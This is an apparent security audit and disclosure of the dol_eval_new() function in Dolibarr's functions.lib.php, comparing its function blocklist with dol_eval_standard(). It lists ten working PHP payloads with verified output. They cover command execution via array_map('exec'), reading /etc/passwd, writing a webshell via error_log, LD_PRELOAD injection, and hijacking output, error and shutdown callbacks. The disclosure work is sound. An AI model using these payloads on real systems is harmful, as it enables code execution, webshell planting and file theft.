# Security Audit: `dol_eval()` Function Family — Proof of Concept

## Executive Summary

A security audit of the `dol_eval()` function family in `htdocs/core/lib/functions.lib.php` reveals **multiple critical vulnerabilities** in `dol_eval_new()` (the token-based sanitizer) that allow **Remote Code Execution (RCE)**, **Arbitrary File Read/Write**, and **Environment Manipulation** when user-controlled input reaches the function.

The `dol_eval_standard()` function (both whitelist and blacklist modes) correctly blocks all tested attack vectors. However, when the `MAIN_USE_DOL_EVAL_NEW` configuration flag is enabled, the application switches to `dol_eval_new()` which has a significantly weaker `prohibited_functions` list — missing ~70+ dangerous functions that `dol_eval_standard()` blocks.

## How to Run the PoCs

```bash
# Main PoC — demonstrates 10 exploit vectors against dol_eval_new()
php poc_dol_eval_rce.php

# Comparison — confirms dol_eval_standard() blocks all the same vectors
php poc_dol_eval_standard.php
```

## Confirmed Vulnerabilities (All PoCs Verified)

### PoC 1: Remote Code Execution via `array_map`

**Payload:** `array_map("exec", array("id"))`

`array_map` accepts a callable as its first argument. Since it is not in `dol_eval_new()`'s `prohibited_functions`, an attacker can use it to call any PHP function (including `exec`, `system`, etc.) with arbitrary arguments.

**Verified output:**
```
array(1) { [0]=> string(51) "uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)" }
```

### PoC 2: Arbitrary File Read via `file_get_contents`

**Payload:** `file_get_contents("/etc/passwd")`

Reads any file accessible to the web server process.

**Verified output:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### PoC 3: Arbitrary File Write via `error_log`

**Payload:** `error_log("<?php system($_GET[c]); ?>", 3, "/var/www/html/shell.php")`

PHP's `error_log()` with mode 3 writes arbitrary content to any writable path. This enables webshell deployment.

**Verified:** File written successfully with attacker-controlled content.

### PoC 4: LD_PRELOAD Injection via `putenv`

**Payload:** `putenv("LD_PRELOAD=/tmp/evil.so")`

Sets environment variables including `LD_PRELOAD`. Combined with `error_log` to write a malicious `.so` file, this enables RCE through shared object injection on the next process spawn.

**Verified:** `getenv("DOL_POC_xxx")` returns attacker-set value.

### PoC 5: Directory Enumeration via `scandir`

**Payload:** `scandir("/etc")`

Lists directory contents for filesystem reconnaissance.

**Verified:** Returns 150 entries from `/etc`.

### PoC 6: Delayed RCE via `register_shutdown_function`

**Payload:** `register_shutdown_function("exec", "whoami")`

Registers a callback that fires when the PHP script exits. The callback runs after normal error handling, making it harder to detect.

**Verified:** Shutdown callback executed and wrote file after script exit.

### PoC 7: Error Handler Hijacking via `set_error_handler`

**Payload:** `set_error_handler("system")`

Replaces PHP's error handler. The next PHP error/warning will invoke the attacker's callback with the error message as an argument.

**Verified:** Error handler successfully replaced.

### PoC 8: Autoloader Hijacking via `spl_autoload_register`

**Payload:** `spl_autoload_register("system")`

Registers an autoloader callback. The next time an undefined class is instantiated, the class name is passed to the attacker's callback.

**Verified:** Autoloader successfully registered.

### PoC 9: Output Buffer Callback RCE via `ob_start`

**Payload:** `ob_start("system")`

Registers `system()` as the output buffer callback. All content that enters the output buffer is then passed to `system()` when the buffer is flushed.

**Verified:** `ob_start()` executed, OB level increased.

### PoC 10: File Read via `file()`

**Payload:** `file("/etc/hostname")`

Reads a file as an array of lines.

**Verified:** Returns hostname.

## Root Cause

`dol_eval_new()` (line ~12129 of `functions.lib.php`) has a `$prohibited_functions` array with only ~30 entries. Compare this to `dol_eval_standard()` which blocks ~100+ functions across these categories:

**Missing from `dol_eval_new()` but present in `dol_eval_standard()`:**

| Category | Missing Functions |
|----------|-------------------|
| Callback-accepting (RCE) | `array_map`, `array_filter`, `array_walk`, `array_walk_recursive`, `array_reduce`, `array_diff_ukey`, `array_intersect_uassoc`, `array_intersect_ukey`, `array_all`, `array_any`, `array_find`, `array_find_key`, `usort`, `uasort`, `uksort`, `ob_start`, `preg_replace_callback`, `preg_replace_callback_array`, `header_register_callback`, `register_shutdown_function`, `register_tick_function`, `set_error_handler`, `set_exception_handler`, `spl_autoload_register`, `spl_autoload_unregister`, `iterator_apply`, `session_set_save_handler`, `forward_static_call`, `forward_static_call_array`, `readline_completion_function`, `readline_callback_handler_install` |
| File read | `file`, `file_exists`, `file_get_contents`, `fget`, `fgetc`, `fgetcsv`, `fscanf`, `fseek`, `is_file`, `is_dir`, `is_link`, `scandir`, `opendir`, `dir` |
| File write | `error_log` |
| Directory operations | `chdir` |
| Environment/process | `putenv`, `dl`, `apache_child_terminate`, `apache_setenv`, `posix_kill`, `posix_setuid`, `posix_setgid`, all `pcntl_*` functions |
| Obfuscation | `base64_decode`, `rawurldecode`, `urldecode`, `str_rot13`, `hex2bin`, `printf`, `sprintf` |
| Dolibarr-specific | `dolEncrypt`, `dolDecrypt`, `dol_dir_list`, `dol_dir_list_in_database`, `dol_concat`, `dol_concatdesc` |
| Information disclosure | `get_defined_functions`, `get_defined_vars`, `get_defined_constants`, `get_declared_classes` |
| Eval-capable | `eval` (blocked by token, but not in function list) |

## Attack Surface

`dol_eval()` processes strings from:
- **Extrafield computed values** (admin-defined, stored in DB, evaluated with mode `'2'`)
- **Extrafield visibility/permission conditions**
- **Menu permissions** (via `verifCond()`)
- **Scheduled job test conditions** (via `verifCond()`)
- **Tab visibility conditions** (via `verifCond()`, mode `'2'`)
- **Accountancy report formulas**

An admin user with access to extrafield configuration, menu configuration, or cron job configuration can inject these payloads. The `MAIN_USE_DOL_EVAL_NEW` flag switches the application to the vulnerable code path.

## Comparison

| Defense Layer | `dol_eval_new()` | `dol_eval_standard()` |
|---|---|---|
| Token-based parsing | Yes | No |
| Character whitelist | No | Yes |
| Function blacklist entries | ~30 | ~100+ |
| Callback functions blocked | **No** | Yes |
| File read blocked | Partial (fopen only) | Yes |
| File write via error_log | **No** | Yes |
| Environment manipulation | **No** | Yes |
| Process control (pcntl) | **No** | Yes |
